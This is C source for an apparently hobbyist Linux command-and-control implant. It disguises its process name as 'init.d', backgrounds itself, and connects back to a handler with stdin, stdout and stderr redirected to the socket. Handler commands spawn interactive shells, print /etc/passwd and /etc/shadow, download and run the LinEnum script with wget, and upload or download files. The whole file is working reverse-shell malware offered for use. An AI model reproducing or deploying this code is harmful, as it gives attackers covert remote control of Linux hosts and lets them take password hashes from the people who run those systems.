//this linux client will be renamed when a cool name is found
//connect to open socket and read from socket for command and control. quit on failed connect
//fork to begin with to background the c2 portion of the payload

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define DEFIPADDR "127.0.0.1"	//default ip if nothing is given
#define DEFPORT 1234			//default port if nothing is given

int main(int argc, char *argv[])
{
	//here we are going to change the name of the binary for PS (kind of hacky)
	char *newName = "init.d";	//the new name of the process
	int len = strlen(argv[0]);	//this will be used to dump current argv[0] value
	for(int i = 0; i < len; i++)
		argv[0][i] = 0;
	strcpy(argv[0], newName);

	//this fork and exit portion are used to background the running process
	int pid = fork();	//fork process and return pid to pid (0 to child, actual pid to parent)

	if(pid) //if parent: quit
		return 1;

	//now we are ready to connect with our background running process

    struct sockaddr_in sa; //socket data structure

	//here we will set up our default listen server information
    sa.sin_family = AF_INET;						//AF_INET = Address Family is IPv4
	sa.sin_addr.s_addr = inet_addr(DEFIPADDR);		//convert our ip string to a host byte arrangement
    sa.sin_port = htons(DEFPORT);					//turns port into network byte format (find out what that means)

	if(argc == 2)
	{
		if(!strcmp("-h", argv[1]))
		{
			printf("Usage: ./linuxClient <IP> <PORT>\n");
			return 1;
		}
		else
			sa.sin_addr.s_addr = inet_addr(argv[1]);	//convert our command line argument ip type and set for sockaddr
	}
	else if(argc == 3)
	{
		sa.sin_addr.s_addr = inet_addr(argv[1]);	//convert our command line argument ip type and set for sockaddr
		int port = atoi(argv[2]);					//convert command line string to int
	    sa.sin_port = htons(port);					//turns command line argument to port ()
	}
	else if(argc > 3)
	{
		printf("usage error: ./linuxClient <IP> <PORT>");
		return -1;
	}

	char buff[8192];
	char command[2048];

    int sock;	//this will be the socket fd for our connection

	sock = socket(AF_INET, SOCK_STREAM, 0);	//sets up our socket descripter

	//printf("Socket descripter value: %d\n", sock); //this is some file descriptor testing

	int check = connect(sock, (struct sockaddr *)&sa, sizeof(sa));	//attempt to connect

	if(check == -1)	//quit on failed connect (value of -1)
		printf("Failed to connect to socket, exiting\n");
	else
	{
		//printf("%d\n", check); //to check what check value is
		dup2(sock, 0);	//stdin moved to socket
		dup2(sock, 1);	//stdout moved to socket
		dup2(sock, 2);	//stderr moved to socket

		//sending output to handler to show connection
		strcpy(buff, "Connection made from linux client\n");
		write(sock, buff, strlen(buff));
		//now we will start getting into the gritty stuff

		int check = 1;	//this will be a prompt for handler (if netcat is used)

		//THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
		char help[32][1024];
		int i = 0;	//this will be used to assist in my indexing because I am lazy

		strcpy(help[i++], "\n----------HELP MENU----------\n\n");
		strcpy(help[i++], "ls - Print contents of directory\n");
		strcpy(help[i++], "pwd -	print working directory\n");
		strcpy(help[i++], "shell - drop into sh shell\n");
		strcpy(help[i++], "shell2 - drop into bash shell\n");
		strcpy(help[i++], "ushell - drop int full bash kind of\n");
		strcpy(help[i++], "zshell - drop into zsh shell kind of\n");
		strcpy(help[i++], "pid - print the working process id\n");
		strcpy(help[i++], "date - get the system datetime\n");
		strcpy(help[i++], "who - print the current users and their ip address\n");
		strcpy(help[i++], "whoami - print the current username\n");
		strcpy(help[i++], "passwd - print the passwd file to screen\n");
		strcpy(help[i++], "shadow - attempt to print the shadow password to the screen\n");
		strcpy(help[i++], "gitenum - wget LinEnum and execute\n");
		strcpy(help[i++], "netcat - setup payload to use netcat listening functionality\n");
		strcpy(help[i++], "download <filename> - download file from client\n");
		strcpy(help[i++], "upload <filename> - upload file to client\n");
		strcpy(help[i++], "clear - clear the current screen\n");
		strcpy(help[i++], "exit - quit from payload\n");
		strcpy(help[i++], "\n------------------------------\n\n");
		//HELP MENU INFO OVER HERE

		char *line	= "Handler> ";
		char *error = "COMMAND NOT RECOGNIZED\n";
		char *nl	= "\n";
		char termi	= '\0';
		char *num	= malloc(sizeof(char) * 32);
		int netcat	= 0;

		while(check)
		{

			if(netcat)	//if a netcat listener is being used, since the line handle is controlled by the handler
				write(sock, line, strlen(line));

			for(int i = 0; i < 2048; i++)
				command[i] = 0;	//reset command to nulls so that no past command is left over

			read(sock, command, sizeof(command));	//read the command from buffer

			//write(sock, command, strlen(command));	//for testing writing command back to handler

			command[strlen(command) -1] = 0;	//take care of the newline

			if(!strcmp("exit", command))
				check = 0;	//exit on this

			else if(!strcmp("shell", command))
				system("/bin/sh");	//fork into a sh shell. return here on exit

			else if(!strcmp("shell2", command))
				system("/bin/bash");	//fork into a bash shell. return here on exit

			else if(!strcmp("ushell", command))
			{
				//cool system command incoming
				system("python -c 'import pty; pty.spawn(\"/bin/bash\")'");	//fork into a full bash shell. return here on exit
			}

			else if(!strcmp("zshell", command))
			{
				//cool system command incoming but specific to zsh
				system("python -c 'import pty; pty.spawn(\"/bin/zsh\")'");	//fork into a full zsh shell. return here on exit
			}

			else if(!strcmp("help", command))
				for(i = 0; i < 20; i++)
					write(sock, help[i], strlen(help[i]));	//write help menu

			else if(!strcmp("download", command))
			{
				int readLen;
				strcpy(buff, "g\0"); //write go ahead so 
				write(sock, buff, strlen(buff));
				char* fileName = malloc(128); //setting up the filename
				//clear out the filename
				for(int i = 0; i < 128; i++)
					fileName[i] = 0;
				read(sock, fileName, sizeof(fileName));
				FILE* file = fopen(fileName, "r");


				if(!file)
				{
					sprintf(buff, "File content not found\n\0", fileName);
					write(sock, buff, 24);
				}
				else
				{
					readLen = fread(buff, 1, sizeof(buff), file);
					write(sock, buff, readLen);
				}

				if(file)
					fclose(file);

				free(fileName);
			}

			else if(!strcmp("upload", command))
			{
				int fileLen;
				strcpy(buff, "g\0"); //write go ahead so handler knows that file contents can come
				write(sock, buff, strlen(buff));

				char* fileName = malloc(128); //setting up the filename
				//clear out the filename
				for(int i = 0; i < 128; i++)
					fileName[i] = 0;
				read(sock, fileName, sizeof(fileName)); //grab filename from the buffer

				//write a response after buffer is done to prep for data
				strcpy(buff, "b\0");
				write(sock, buff, strlen(buff));

				//read the file data into the buffer
				fileLen = read(sock, buff, sizeof(buff));

				FILE* file = fopen(fileName, "w");

				if(!file)
					continue;
				else
					fwrite(buff, 1, fileLen, file);

				free(fileName);
				fclose(file);
			}

			else if(!strcmp("ls", command))
				system("/bin/ls");	//print current directory contents

			else if(!strcmp("pwd", command))
				system("pwd");		//print current working directory

			else if(!strcmp("pid", command))
			{
				int p = getpid();	//returns the running process id to variable p
				sprintf(num, "PID: %d\n", p);	//writes the integer to a string so we can write to socket
				write(sock, num, strlen(num));	//writes string representation of integer to the socket
			}

			else if(!strcmp("date", command))
				system("date");		//display date/time information on the target box

			else if(!strcmp("who", command))
				system("w -i");		//display the current users with ip address as the from instead of hostnames

			else if(!strcmp("whoami", command))
				system("whoami");	//display the current running username

			else if(!strcmp("passwd", command))
				system("cat /etc/passwd");	//open and write passwd file contents

			else if(!strcmp("shadow", command))
				system("cat /etc/shadow");	//open and write shadow file contents (one way to prove root perms)

			else if(!strcmp("gitenum", command))
			{
				system("wget https:\/\/raw.githubusercontent.com\/rebootuser\/LinEnum\/master\/LinEnum.sh");
				system("/bin/bash LinEnum.sh");
			}

			else if(!strcmp("clear", command))	//clears the C2 screen
				system("clear");

			else if(!strcmp("netcat", command)) //sets up payload for NetCat Functionality
				netcat = !netcat;

			else if(!strcmp("", command))	//do nothing on empty command
				continue;

			else
				write(sock, error, strlen(error));	//write error message if commnd is not recognized
		}


		strcpy(buff, "\nPayload connection closing\n");	//on exit print a nice message
		write(sock, buff, strlen(buff));			//write that message to the socket

		//free up heap memory
		free(num);
		free(newName);
		free(line);
		free(error);
		free(nl);
	}

	//exit
	return 0;
}
